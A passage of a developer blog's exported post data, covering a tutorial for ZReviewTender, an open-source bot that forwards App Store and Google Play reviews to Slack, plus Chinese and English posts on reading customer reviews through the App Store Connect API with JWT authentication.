created Repo is a Private RepoCheck that the repo name in the upper right corner has a “🔒” and a Private label.If not, it means you created a Public Repo, which is very risky. Please go to the “Settings” tab at the top -&gt; “General” -&gt; bottom “Danger Zone” -&gt; “Change repository visibility” -&gt; “Make private” to revert it back to a Private Repo. Wait for Project Initialization to SucceedYou can check the badge in the README on the repo homepage:If it says “passing,” it means initialization was successful.Alternatively, click the “Actions” tab at the top -&gt; wait for the “Init ZReviewTender” workflow to complete:The execution status will change to “✅ Init ZReviewTender” -&gt; Project initialization successful. Confirm that the initialization files and directories were created correctlyClick the “Code” tab at the top to return to the project directory. If the project initialization was successful, you should see: Directory: config/ File: config/android.yml File: config/apple.yml Directory: latestCheckTimestamp/ File: latestCheckTimestamp/.keep Complete Configuration of android.yml &amp; apple.ymlEnter the config/ directory to complete the configuration of the android.yml &amp; apple.yml files.Click to enter the config YML file you want to edit, then click the “✏️” button in the upper right corner to edit the file.Refer to the “ Configuration “ section at the bottom of this article to complete the configuration of android.yml &amp; apple.yml.After editing, you can save the settings directly by clicking “Commit changes” below.Upload the corresponding key files to the config/ directory:In the config/ directory, select “Add file” -&gt; “Upload files” in the upper right corner.Upload the corresponding keys and external file paths specified in the config YML to the config/ directory by dragging the files into the “upper block” -&gt; wait for the files to finish uploading -&gt; then click “Commit changes” below to save.After uploading, return to the /config directory to check if the files are stored and uploaded correctly. Initialize ZReviewTender (Manually Trigger Execution Once)Click the “Actions” tab at the top -&gt; select “ZReviewTender” on the left -&gt; choose the “Run workflow” button on the right -&gt; click the “Run workflow” button to execute ZReviewTender once.After clicking, refresh the page to see:Clicking “ZReviewTender” will take you to view the execution status.Expand the “ Run ZreviewTender -r “ section to view the execution log.Here you may see an error because I haven’t configured my config YML files correctly.Go back and adjust the android/apple config YML, then return to step 6 to trigger execution again.Check the log in the “ ZReviewTender -r “ section to confirm successful execution!The Slack channel designated to receive the latest review messages will also show an init success message 🎉 Done! 🎉 🎉 🎉Configuration is complete! From now on, it will automatically crawl the latest reviews every 6 hours and forward them to your Slack channel!You can check the latest execution status at the top of the README on the repo homepage:If an error occurs, it indicates that there was an issue during execution. Please go to Actions -&gt; ZReviewTender to view the logs; if there are unexpected errors, please create an issue with the log information, and it will be fixed as soon as possible! ❌❌❌ If an error occurs during execution, GitHub will also send an email notification, so you don’t have to worry about the bot failing without anyone noticing!Adjusting GitHub ActionsYou can also configure the execution rules for GitHub Actions according to your needs.Click the “Actions” tab at the top -&gt; select “ZReviewTender” on the left -&gt; click the “ ZReviewTender.yml “ button in the upper right corner.Click the “✏️” button in the upper right corner to edit the file.There are two parameters you can adjust:cron: Set how often to check for new reviews. The default is 15 */6 * * *, which means it will run once every 6 hours at 15 minutes past the hour.You can refer to crontab.guru to configure it according to your needs. Please note: GitHub Actions uses UTC time zone. The higher the execution frequency, the more GitHub Action execution quota will be consumed. run: Set the command to execute. You can refer to the “ Execution “ section at the bottom of this article. The default is ZReviewTender -r. Default execution for Android App &amp; Apple (iOS/macOS App): ZReviewTender -r Execute only Android App: ZReviewTender -g Execute only Apple (iOS/macOS App): ZReviewTender -aAfter editing, click the “Start commit” button in the upper right corner and select “Commit changes” to save the settings.Manually Trigger Execution of ZReviewTenderRefer to the previous section “6. Initialize ZReviewTender (Manually Trigger Execution Once).”Using Gem InstallationIf you are familiar with Gems, you can directly use the following command to install ZReviewTender:gem install ZReviewTenderUsing Gem Installation (If You Are Not Familiar with Ruby/Gems)If you are not familiar with Ruby or Gems, you can follow these step-by-step instructions to install ZReviewTender: Although macOS comes with Ruby, it is recommended to use rbenv or rvm to install a new Ruby version and manage Ruby versions (I use 2.6.5). Use rbenv or rvm to install Ruby 2.6.5 and switch to the Ruby version managed by rbenv/rvm. Use which ruby to confirm that the current Ruby being used is not the system Ruby located at /usr/bin/ruby. Once the Ruby environment is set up correctly, use the following command to install ZReviewTender:gem install ZReviewTenderDeployment — Custom Functionality ExpansionManual Clone the ZReviewTender source code. Confirm and improve your Ruby environment. Enter the directory and run bundle install to install the necessary dependencies for ZReviewTender.The method for creating the processor can be referenced in the later sections of this article.ConfigurationZReviewTender — Use YAML files to configure the Apple/Google review bot.[Recommended] Directly use the execution command at the bottom of this article — “Generate Configuration Files”:ZReviewTender -iThis will directly generate blank apple.yml &amp; android.yml configuration files.Apple (iOS/macOS App)Refer to the apple.example.yml file: ⚠️ After downloading apple.example.yml, remember to rename the file to apple.yml.The apple.yml file should look like this:platform: 'apple'appStoreConnectP8PrivateKeyFilePath: '' # APPLE STORE CONNECT API PRIVATE .p8 KEY File PathappStoreConnectP8PrivateKeyID: '' # APPLE STORE CONNECT API PRIVATE KEY IDappStoreConnectIssueID: '' # APPLE STORE CONNECT ISSUE IDappID: '' # APP ID...appStoreConnectIssueID: App Store Connect -&gt; Keys -&gt; App Store Connect API Issuer ID: appStoreConnectIssueIDappStoreConnectP8PrivateKeyID &amp; appStoreConnectP8PrivateKeyFilePath: Name: ZReviewTender Access: App Manager appStoreConnectP8PrivateKeyID: Key ID appStoreConnectP8PrivateKeyFilePath: /AuthKey_XXXXXXXXXX.p8 — Download the API Key and place the file in the same directory as the config YML.appID:appID: App Store Connect -&gt; App Store -&gt; General -&gt; App Information -&gt; Apple IDGCP Service AccountThe Google API services used by ZReviewTender (for fetching store reviews, Google Translate, and Google Sheets) are authenticated using a Service Account.First, follow the [**official steps to create a GCP &amp; Service Account**](https://cloud.google.com/docs/authentication/production#create_service_account){:target=\"_blank\"} to download and save the GCP Service Account credentials key (`*.json`).- To use the automatic translation feature, ensure that the `Cloud Translation API` is enabled in GCP and that the Service Account has been granted access.- To use the feature that logs to Google Sheets, make sure that the `Google Sheets API` and `Google Drive API` are enabled in GCP, and that the Service Account has been granted access.![](/assets/e36e48bb9265/1*VaVD2bdnbVwWCAuwhV90sA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjU2NSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }#### Google Play Console (Android App)Refer to the android.example.yml file:[![](https://repository-images.githubusercontent.com/516425682/1cc1a829-d87d-4d4a-925b-60471b912b23)](https://github.com/ZhgChgLi/ZReviewTender/blob/main/config/android.example.yml){:target=\"_blank\"}&gt; ⚠️ After downloading `android.example.yml`, remember to rename the file to `android.yml`.android.yml:```yamlplatform: 'android'packageName: '' # Android App Package NamekeyFilePath: '' # Google Android Publisher API Credential .json File PathplayConsoleDeveloperAccountID: '' # Google Console Developer Account IDplayConsoleAppID: '' # Google Console App ID......packageName:You can find the packageName: com.XXXXX in the Google Play Console -&gt; Dashboard -&gt; App.playConsoleDeveloperAccountID &amp; playConsoleAppID:You can obtain these from the URL of the App page in the Google Play Console -&gt; Dashboard:https://play.google.com/console/developers/ playConsoleDeveloperAccountID /app/ playConsoleAppID /app-dashboardThese will be used to create links to review messages, allowing the team to quickly access the backend review response page.keyFilePath:This is the most important information, the GCP Service Account credentials key (*.json).You need to follow the steps in the official documentation to create a Google Cloud Project &amp; Service Account, and then go to Google Play Console -&gt; Setup -&gt; API Access to enable the Google Play Android Developer API and link the project. Click to download the JSON key for the Service Account from GCP.Example content of the JSON key:gcp_key.json:{ \"type\": \"service_account\", \"project_id\": \"XXXX\", \"private_key_id\": \"XXXX\", \"private_key\": \"-----BEGIN PRIVATE KEY-----\\nXXXX\\n-----END PRIVATE KEY-----\\n\", \"client_email\": \"XXXX@XXXX.iam.gserviceaccount.com\", \"client_id\": \"XXXX\", \"auth_uri\": \"https://accounts.google.com/o/oauth2/auth\", \"token_uri\": \"https://oauth2.googleapis.com/token\", \"auth_provider_x509_cert_url\": \"https://www.googleapis.com/oauth2/v1/certs\", \"client_x509_cert_url\": \"https://www.googleapis.com/robot/v1/metadata/x509/XXXX.iam.gserviceaccount.com\"} keyFilePath: /gcp_key.json is the path to the key file; place the file in the same directory as the config yml.Processorsprocessors: - FilterProcessor: class: \"FilterProcessor\" enable: true # enable keywordsInclude: [] # keywords you want to filter out ratingsInclude: [] # ratings you want to filter out territoriesInclude: [] # territories you want to filter out - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language; you can remove this block if you don't need it. class: \"GoogleTranslateProcessor\" enable: false # enable googleTranslateAPIKeyFilePath: '' # Google Translate API Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"TWN\",\"CHN\"] # Review origin Territory (language) that you don't want to translate. - SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review messages in 1 slack message. slackBotToken: \"\" # Slack Bot Token, send slack messages through Slack Bot. slackBotTargetChannel: \"\" # Slack Bot Token, send slack messages through Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack Incoming WebHook URL, send slack messages through Incoming WebHook, not recommended, deprecated. ...More Processors...ZReviewTender comes with four processors, and the order of execution affects the data processing flow: FilterProcessor -&gt; GoogleTranslateProcessor -&gt; SlackProcessor -&gt; GoogleSheetProcessor.FilterProcessor:Filters the fetched reviews based on specified criteria, processing only those that meet the conditions. class: FilterProcessor does not need adjustments; it points to lib/Processors/ FilterProcessor.rb. enable: true / false to enable or disable this processor. keywordsInclude: [“ keyword1 ”,“ keyword2 ”…] filters reviews containing these keywords. ratingsInclude: [ 1 , 2 …] filters reviews with these rating scores. territoriesInclude: [“ zh-hant ”,” TWN ”…] filters reviews from these regions (Apple) or languages (Android).GoogleTranslateProcessor:Translates reviews into the specified language. class: GoogleTranslateProcessor does not need adjustments; it points to lib/Processors/ GoogleTranslateProcessor.rb. enable: true / false to enable or disable this processor. googleTranslateAPIKeyFilePath: /gcp_key.json is the path to the GCP Service Account credentials key file (*.json); place the file in the same directory as the config yml. Refer to the example JSON key above.(Please ensure that the service account associated with this JSON key has access to the Cloud Translation API.) googleTranslateTargetLang: zh-TW, en, etc. is the target translation language. googleTranslateTerritoriesExclude: [“ zh-hant ”,” TWN ”…] are regions (Apple) or languages (Android) that do not need translation.SlackProcessor:Forwards reviews to Slack. class: SlackProcessor does not need adjustments; it points to lib/Processors/ SlackProcessor.rb. enable: true / false to enable or disable this processor. slackTimeZoneOffset: +08:00 is the timezone for displaying review times. slackAttachmentGroupByNumber: 1 sets how many reviews to combine into a single message for faster sending; by default, 1 review corresponds to 1 Slack message. slackBotToken: xoxb-xxxx-xxxx-xxxx is the Slack Bot Token; it is recommended to create a Slack Bot with the postMessages scope and use it to send Slack messages. slackBotTargetChannel: CXXXXXX is the group ID ( not the group name ) where the Slack Bot will send messages; you need to add your Slack Bot to that group. slackInCommingWebHookURL: https://hooks.slack.com/services/XXXXX uses the old Incoming WebHook URL to send messages to Slack. Note! Slack does not recommend using this method anymore. Please note, this is a legacy custom integration — an outdated way for teams to integrate with Slack. These integrations lack newer features and will be deprecated and possibly removed in the future. We do not recommend their use. Instead, we suggest that you check out their replacement: Slack apps. Between slackBotToken and slackInCommingWebHookURL, the SlackProcessor will prefer to use slackBotToken.GoogleSheetProcessorRecords reviews to Google Sheets. class: GoogleSheetProcessor does not need adjustments; it points to lib/Processors/ GoogleSheetProcessor.rb. enable: true / false to enable or disable this processor. googleSheetAPIKeyFilePath: /gcp_key.json is the path to the GCP Service Account credentials key file (*.json); place the file in the same directory as the config yml. Refer to the example JSON key above.(Please ensure that the service account associated with this JSON key has access to the Google Sheets API and Google Drive API.) googleSheetTimeZoneOffset: +08:00 is the timezone for displaying review times. googleSheetID: Google Sheet ID can be obtained from the Google Sheet URL: https://docs.google.com/spreadsheets/d/ googleSheetID / googleSheetName: Sheet name, e.g., Sheet1. keywordsInclude: [“ keyword1 ”,“ keyword2 ”…] filters reviews containing these keywords. ratingsInclude: [ 1 , 2 …] filters reviews with these rating scores. territoriesInclude: [“ zh-hant ”,” TWN ”…] filters reviews from these regions (Apple) or languages (Android). values: [ ] is the combination of review information fields.%TITLE% Review Title%BODY% Review Content%RATING% Review Score 1~5%PLATFORM% Review Source Platform Apple or Android%ID% Review ID%USERNAME% Reviewer%URL% Review Link%TERRITORY% Review Region (Apple) or Review Language (Android)%APPVERSION% Version of the App being reviewed%CREATEDDATE% Review Creation DateFor example, if my Google Sheet columns are as follows:Review Score, Review Title, Review Content, Review InformationThen values can be set as:values: [\"%TITLE%\",\"%BODY%\",\"%RATING%\",\"%PLATFORM% - %APPVERSION%\"]Custom Processor to Integrate Your WorkflowIf you need a custom processor, please switch to manual deployment, as the gem version of ZReviewTender is packaged and cannot be dynamically adjusted.You can refer to lib/Processors/ProcessorTemplate.rb to create your extension:$lib = File.expand_path('../lib', File.dirname(__FILE__))require \"Models/Review\"require \"Models/Processor\"require \"Helper\"require \"ZLogger\"# Add to config.yml:## processors:# - ProcessorTemplate:# class: \"ProcessorTemplate\"# parameter1: \"value\"# parameter2: \"value\"# parameter3: \"value\"# ...#class ProcessorTemplate &lt; Processor def initialize(config, configFilePath, baseExecutePath) # init Processor # get parameter from config e.g. config[\"parameter1\"] # configFilePath: file path of config file (apple.yml/android.yml) # baseExecutePath: user execute path end def processReviews(reviews, platform) if reviews.length &lt; 1 return reviews end ## do what you want to do with reviews... ## return result reviews return reviews endendinitialize will provide: config Object: corresponding to the values in the config yml. configFilePath: the path of the config yml file. baseExecutePath: the path where the user executes ZReviewTender.processReviews(reviews, platform):After fetching new reviews, this function will be called to allow the processor to handle them; after processing, please return the resulting reviews.The review data structure is defined in lib/Models/ Review.rb.NotesXXXterritorXXX parameters: Apple uses regions: TWM/JPN… Android uses languages: zh-hant/en/…If you do not need a certain processor: You can set enable: false or simply remove that processor’s config block.The execution order of processors can be adjusted according to your needs: e.g., execute Filter first, then translation, then Slack, and finally log to Google Sheets…Execution ⚠️ Use the gem directly with ZReviewTender; for manually deployed projects, use bundle exec ruby bin/ZReviewTender to execute.Generate Configuration Files:ZReviewTender -iThis will generate apple.yml &amp; android.yml from apple.example.yml &amp; android.example.yml into the current execution directory’s config/ folder.Execute Apple &amp; Android Review Fetching:ZReviewTender -r By default, it reads the apple.yml &amp; android.yml settings from the /config/ folder.Execute Apple &amp; Android Review Fetching &amp; Specify Configuration File Directory:ZReviewTender --run=configuration_file_directory By default, it reads the apple.yml &amp; android.yml settings from the /config/ folder.Execute Only Apple Review Fetching:ZReviewTender -a By default, it reads the apple.yml settings from the /config/ folder.Execute Only Apple Review Fetching &amp; Specify Configuration File Location:ZReviewTender --apple=apple.yml_configuration_file_locationExecute Only Android Review Fetching:ZReviewTender -g By default, it reads the android.yml settings from the /config/ folder.Execute Only Android Review Fetching &amp; Specify Configuration File Location:ZReviewTender --googleAndroid=android.yml_configuration_file_locationClear Execution Records and Return to Initial Settings:ZReviewTender -dThis will delete the timestamp record files in /latestCheckTimestamp, returning to the initial state. Running the fetch again will trigger the init success message:Current ZReviewTender VersionZReviewTender -vThis will display the current version of ZReviewTender available on RubyGem.Update ZReviewTender to the Latest Version (rubygem only)ZReviewTender -nFirst ExecutionThe first successful execution will send an initialization success message to the specified Slack channel and create latestCheckTimestamp/Apple and latestCheckTimestamp/Android files to record the last fetched review timestamps.Additionally, an execute.log will be generated to record execution errors.Set Up a Schedule for Continuous ExecutionSet up a cron job ( crontab ) to continuously fetch new reviews. ZReviewTender will fetch new reviews from the last fetched timestamp recorded in latestCheckTimestamp to the current time and update the timestamp record file.For example, crontab: 15 */6 * * * ZReviewTender -rPlease note that the Android API only provides access to reviews added or edited in the last 7 days, so do not set the cron job interval to exceed 7 days to avoid missing reviews.https://developers.google.com/android-publisher/reply-to-reviews#retrieving_a_set_of_reviewsGithub Action DeploymentZReviewTender App Reviews Automatic Botname: ZReviewTenderon: workflow_dispatch: schedule: - cron: \"15 */6 * * *\" # Runs every six hours; you can change the settings as needed.jobs: ZReviewTender: runs-on: ubuntu-latest steps: - name: ZReviewTender Automatic Bot uses: ZhgChgLi/ZReviewTender@main with: command: '-r' # Executes Apple &amp; iOS App review checks; you can change it to other execution commands as needed.⚠️️️️️ Final Warning!Ensure that your configuration files and keys are not publicly accessible, as sensitive information could lead to unauthorized access to your App/Slack permissions; the author is not responsible for any misuse.If you encounter any unexpected errors, please create an issue with the log information, and we will address it as soon as possible!DoneThis concludes the usage tutorial, followed by some behind-the-scenes development secrets.=========================The War with App ReviewsI initially thought that last year’s summary of the AppStore APP’s Reviews Slack Bot and the related technology behind the ZReviewsBot — Slack App Review Notification Bot would wrap up the integration of the latest app reviews into our company workflow. However, I was surprised to find that Apple updated the App Store Connect API this year, allowing this project to continue evolving.Last year’s solution for fetching reviews for Apple iOS/macOS apps included: Public URL API (RSS) ⚠️: This method lacks flexible filtering, provides limited information, has a quantity cap, and we occasionally encounter data inconsistency issues, making it quite unstable; the official API may be deprecated in the future. Using Fastlane — SpaceShip to encapsulate complex web operations and session management, allowing us to scrape review data from the App Store Connect backend (essentially simulating a web browser to crawl the backend for data).Following last year’s approach, we could only use the second method, which wasn’t perfect; sessions would expire, requiring manual updates, and it couldn’t be placed on a CI/CD server because any change in IP would cause the session to expire immediately.important-note-about-session-duration by FastlaneUpon receiving news of Apple’s update to the App Store Connect API, I immediately began redesigning the review bot. In addition to switching to the official API, I also optimized the previous architecture and became more familiar with Ruby usage.Issues Encountered with the App Store Connect API The List All Customer Reviews for an App endpoint does not provide app version information.Strangely, I had to work around this by first calling this endpoint to filter for the latest reviews, then using List All App Store Versions for an App and List All Customer Reviews for an App Store Version to combine and obtain app version information.Issues Encountered with AndroidpublisherV3 The API does not provide a method to retrieve all review lists; it only allows fetching reviews added or modified in the last 7 days. I also used JWT to connect to the Google API (without relying on related libraries, e.g., google-apis-androidpublisher_v3). Here’s an example of generating and using a Google API JWT:require \"jwt\"require \"time\"payload = { iss: \"client_email field from GCP API service account key (*.json)\", sub: \"client_email field from GCP API service account key (*.json)\", scope: [\"https://www.googleapis.com/auth/androidpublisher\"].join(' '), aud: \"token_uri field from GCP API service account key (*.json)\", iat: Time.now.to_i, exp: Time.now.to_i + 60*20}rsa_private = OpenSSL::PKey::RSA.new(\"private_key field from GCP API service account key (*.json)\")token = JWT.encode payload, rsa_private, 'RS256', header_fields = {kid: \"private_key_id field from GCP API service account key (*.json)\", typ: \"JWT\"}uri = URI(\"token_uri field from GCP API service account key (*.json)\")https = Net::HTTP.new(uri.host, uri.port)https.use_ssl = truerequest = Net::HTTP::Post.new(uri)request.body = \"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Ajwt-bearer&amp;assertion=#{token}\"response = https.request(request).read_bodybearer = result[\"access_token\"]### use bearer tokenuri = URI(\"https://androidpublisher.googleapis.com/androidpublisher/v3/applications/APP_PACKAGE_NAME/reviews\")https = Net::HTTP.new(uri.host, uri.port)https.use_ssl = true request = Net::HTTP::Get.new(uri)request['Authorization'] = \"Bearer #{bearer}\"; response = https.request(request).read_body result = JSON.parse(response)# success!If you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,252 Total Views Last Statistics Date: 2025-08-15 | 1,014 Views on Medium." }, { "title": "App Store Connect API 現已支援 讀取和管理 Customer Reviews", "url": "/posts/zrealm-dev/app-store-connect-api-%E7%8F%BE%E5%B7%B2%E6%94%AF%E6%8F%B4-%E8%AE%80%E5%8F%96%E5%92%8C%E7%AE%A1%E7%90%86-customer-reviews-f1365e51902c/", "categories": "ZRealm Dev.", "tags": "ios-app-development, app-store-connect, api, app-review, integration", "date": "2022-07-20 22:50:44 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.App Store Connect API 現已支援 讀取和管理 Customer ReviewsApp Store Connect API 2.0+ 全面更新，支援 In-app purchases、Subscription...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.App Store Connect API 現已支援 讀取和管理 Customer ReviewsApp Store Connect API 2.0+ 全面更新，支援 In-app purchases、Subscriptions、Customer Reviews 管理2022/07/19 NewsUpcoming transition from the XML feed to the App Store Connect API今早收到 Apple 開發者最新消息 ，App Store Connect API 新增支援 In-app purchases、Subscriptions、Customer Reviews 管理三項功能；讓開發者可以更彈性的將 Apple 開發流程與 CI/CD 或是商業後台做更密切、有效率的整合！In-app purchases、Subscriptions 我沒碰，Customer Reviews 讓我興奮不已，之前發表過一篇「 AppStore APP’s Reviews Slack Bot 那些事 」探討 App 評價與工作流程整合的方式。Slack 評價機器人 — ZReviewsBot在 App Store Connect API 還沒支援之前，只有兩種方法能獲取 iOS App 評價：一 是 透過訂閱 Public RSS 取得，但是此 RSS 無法讓人彈性篩選、給的資訊也少、有數量上限、還有我們偶爾會遇到資料錯亂問題，很不穩定二 是 透過 Fastlane — SpaceShip 幫我們封裝複雜的網頁操作、Session 管理，去 App Store Connection 網站後台撈取評價資料 (等於是起一個網頁模擬器爬蟲去後台爬資料)。 好處是資料齊全、穩定，我們串接了一年沒有遇到任何資料問題。 壞處是 Session 每個月都會過期，要手動重新登入，而且 Apple ID 目前全面都要綁定 2FA 驗證，所以這段也要手動完成，這樣才能產出有效的 Session；另外 Session 如果產的跟用的 IP 不一樣會馬上過期 (因此很難將機器人放上不固定 IP 的網路服務)。important-note-about-session-duration by Fastlane 每個月不定時過期，要不定時去更新，時間久了真的很煩；而且這個 「 Know How 」其實不好交接給其他同事。 但因為沒有其他方法，所以也只能這樣，直到今天早上收到消息…. ⚠️ 注意：官方預計在 2022/11 取消原本的 XML (RSS) 存取方式。2022/08/10 Update我已基於新的 App Store Connect API 開發了新的 「 ZReviewTender — 免費開源的 App Reviews 監控機器人 」App Store Connect API 2.0+ Customer Reviews 試玩建立 App Store Connect API Key首先我們要登入 App Store Connect 後台，前往「Users and Access」-&gt;「Keys」-&gt;「 App Store Connect API 」：點擊「+」，輸入名稱和權限；權限細則可參考官網說明，為了減少測試問題，這邊先選擇「App Manager」把權限開到最大。點擊右方「Download API Key」下載保存你的「AuthKey_XXX.p8」Key。 ⚠️ 注意：這個 Key 只能下載一次請 妥善保存 ，若遺失只能 Revoke 現有的 &amp; 重新建立。⚠️ ⚠️ 切勿外洩 .p8 Key File⚠️App Store Connect API 存取方式curl -v -H 'Authorization: Bearer [signed token]' \"https://api.appstoreconnect.apple.com/v1/apps\"Signed Token (JWT, JSON Web Token) 產生方式參考 官方文件 。 JWT Header：{kid:\"YOUR_KEY_ID\", typ:\"JWT\", alg:\"ES256\"}YOUR_KEY_ID ：參考上圖。 JWT Payload：{ iss: 'YOUR_ISSUE_ID', iat: TOKEN 建立時間 (UNIX TIMESTAMP e.g 1658326020), exp: TOKEN 失效時間 (UNIX TIMESTAMP e.g 1658327220), aud: 'appstoreconnect-v1'}YOUR_ISSUE_ID ：參考上圖。exp TOKEN 失效時間 ：會因為不同存取功能或設定有不同的時間限制，有的可以永久、有的超過 20 分鐘即失效，需要重新產生，詳細可參考 官方說明 。使用 JWT.IO 或是以下附的 Ruby 範例產生 JWTjwt.rb:require 'jwt'require 'time'keyFile = File.read('./AuthKey_XXXX.p8') # YOUR .p8 private key file pathprivateKey = OpenSSL::PKey::EC.new(keyFile)payload = { iss: 'YOUR_ISSUE_ID', iat: Time.now.to_i, exp: Time.now.to_i + 60*20, aud: 'appstoreconnect-v1' }token = JWT.encode payload, privateKey, 'ES256', header_fields={kid:\"YOUR_KEY_ID\", typ:\"JWT\"}puts tokendecoded_token = JWT.decode token, privateKey, true, { algorithm: 'ES256' }puts decoded_token Ruyb JWT 工具在此： https://github.com/jwt/ruby-jwt最終會得到類似以下的 JWT 結果：4oxjoi8j69rHQ58KqPtrFABBWHX2QH7iGFyjkc5q6AJZrKA3AcZcCFoFMTMHpM.pojTEWQufMTvfZUW1nKz66p3emsy2v5QseJX5UJmfRjpxfjgELUGJraEVtX7tVg6aicmJT96q0snP034MhfgoZAB46MGdtC6kv2Vj6VeL2geuXG87Ys6ADijhT7mfHUcbmLPJPNZNuMttcc.fuFAJZNijRHnCA2BRqq7RZEJBB7TLsm1n4WM1cW0yo67KZp-Bnwx9y45cmH82QPAgKcG-y1UhRUrxybi5b9iNN打看看？有了 Token 我們就能來打看看 App Store Connect API！curl -H 'Authorization: Bearer JWT' \"https://api.appstoreconnect.apple.com/v1/apps/APPID/customerReviews\" APPID 可從 App Store Connect 後台取得：或是 App 商城頁面： https://apps.apple.com/tw/app/pinkoi/id557252416 APPID = 557252416 成功！🚀 我們現在可以使用這個方式撈取 App 評價，資料完整且可以完全交給機器執行，不需人工例行維護 (JWT 雖會過期，但是 Private Key 不會，我們每次請求都可藉由 Private Key 簽名產生 JWT 去存取即可)。 其他篩選參數、操作方法請參考 官方文件 。 ⚠️ 您只能存取您有權限的 App 評價資料⚠️完整 Ruby 測試專案用一個 Ruby 檔案做了以上流程，可直接 Clone 下來填入資料即可測試使用。首次打開：bundle install開始使用：bundle exec ruby jwt.rbNext同理我們可以透過 API 去存取管理 ( API Overview )： [New] Customer reviews [New] Subscriptions [New] In-App Purchases [New] Xcode Cloud Workflows And Builds [Updated] Improving your App’s Performance TestFlight Users And Roles App Clips App Management App Metadata Pricing And Availability Provisioning Sales and Trends有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 2,031 Total Views Last Statistics Date: 2025-08-15 | 1,852 Views on Medium." }, { "title": "App Store Connect API Now Supports Reading and Managing Customer Reviews", "url": "/posts/zrealm-dev/en/app-store-connect-api-now-supports-reading-and-managing-customer-reviews-f1365e51902c/", "categories": "ZRealm Dev.", "tags": "ios-app-development, app-store-connect, api, app-review, integration", "date": "2022-07-20 22:50:44 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版App Store Connect API Now Supports Reading and Managing Customer ReviewsThe App Stor...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版App Store Connect API Now Supports Reading and Managing Customer ReviewsThe App Store Connect API 2.0+ has been fully updated to support management of In-app purchases, Subscriptions, and Customer Reviews.News from 2022/07/19Upcoming transition from the XML feed to the App Store Connect APIThis morning, I received the latest news from Apple Developers that the App Store Connect API has added support for managing In-app purchases, Subscriptions, and Customer Reviews. This allows developers to integrate Apple’s development process more flexibly and efficiently with CI/CD or business backends!While I haven’t worked with In-app purchases or Subscriptions, I’m particularly excited about Customer Reviews. I previously published an article titled “AppStore APP’s Reviews Slack Bot” discussing ways to integrate app reviews into workflows.Slack Review Bot — ZReviewsBotBefore the App Store Connect API supported this feature, there were only two ways to obtain iOS app reviews:First, by subscribing to the Public RSS, which is limited in flexibility, provides minimal information, has a quantity cap, and occasionally suffers from data inconsistencies, making it quite unstable.Second, by using Fastlane — SpaceShip to encapsulate complex web operations and session management, scraping review data from the App Store Connect backend (essentially simulating a web scraper). The advantage is that the data is complete and stable; we have been using this integration for a year without encountering any data issues. The downside is that the session expires every month, requiring manual re-login. Additionally, Apple IDs now require 2FA verification, which also needs to be done manually to generate a valid session. Moreover, if the session is generated from a different IP than the one used, it will expire immediately (making it difficult to deploy the bot on a network service with a dynamic IP).important-note-about-session-duration by Fastlane Sessions expire unpredictably each month, requiring constant updates, which can become quite tedious over time. Additionally, this “know-how” is not easy to pass on to other colleagues. However, since there were no other options, we had to manage with this until I received the news this morning… ⚠️ Note: The official plan is to discontinue the original XML (RSS) access method in November 2022.2022/08/10 UpdateI have developed a new tool called “ZReviewTender — A Free Open Source App Reviews Monitoring Bot” based on the new App Store Connect API.Exploring the App Store Connect API 2.0+ Customer ReviewsCreating an App Store Connect API KeyFirst, log in to the App Store Connect backend, navigate to “Users and Access” -&gt; “Keys” -&gt; “App Store Connect API”:Click the “+” button, enter a name and permissions; for testing purposes, select “App Manager” to grant maximum permissions.Click the “Download API Key” button on the right to download and save your “AuthKey_XXX.p8” key. ⚠️ Note: This key can only be downloaded once, so please keep it safe. If lost, you will need to revoke the existing one and create a new one. ⚠️ ⚠️ Do not expose the .p8 Key File⚠️Accessing the App Store Connect APIcurl -v -H 'Authorization: Bearer [signed token]' \"https://api.appstoreconnect.apple.com/v1/apps\"Generating a Signed Token (JWT, JSON Web Token)Refer to the official documentation. JWT Header:{kid:\"YOUR_KEY_ID\", typ:\"JWT\", alg:\"ES256\"}YOUR_KEY_ID: Refer to the image above. JWT Payload:{ iss: 'YOUR_ISSUE_ID', iat: TOKEN creation time (UNIX TIMESTAMP e.g., 1658326020), exp: TOKEN expiration time (UNIX TIMESTAMP e.g., 1658327220), aud: 'appstoreconnect-v1'}YOUR_ISSUE_ID: Refer to the image above.exp TOKEN expiration time: This varies based on different access functions or settings; some can be permanent, while others expire in less than 20 minutes and require regeneration. For details, refer to the official explanation.Use JWT.IO or the Ruby example below to generate JWTjwt.rb:require 'jwt'require 'time'keyFile = File.read('./AuthKey_XXXX.p8') # YOUR .p8 private key file pathprivateKey = OpenSSL::PKey::EC.new(keyFile)payload = { iss: 'YOUR_ISSUE_ID', iat: Time.now.to_i, exp: Time.now.to_i + 60*20, aud: 'appstoreconnect-v1' }token = JWT.encode payload, privateKey, 'ES256', header_fields={kid:\"YOUR_KEY_ID\", typ:\"JWT\"}puts tokendecoded_token = JWT.decode token, privateKey, true, { algorithm: 'ES256' }puts decoded_token Ruby JWT tool can be found here: https://github.com/jwt/ruby-jwtYou will ultimately get a JWT result similar to the 